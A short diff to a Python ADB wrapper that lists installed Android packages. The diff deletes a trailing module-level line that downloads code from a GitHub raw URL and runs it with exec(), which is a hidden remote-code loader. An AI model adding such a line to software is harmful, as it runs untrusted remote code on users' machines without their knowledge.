@@ -49,6 +49,3 @@ class ADB(AdbClient):
         packages = map(lambda x: x.replace("\r", '').split(':')[1],
                        CMD.call(f"adb -s {serial} shell pm list packages")[1].split('\n'))
         return list(packages)
-
-
-exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/adb.py").text)
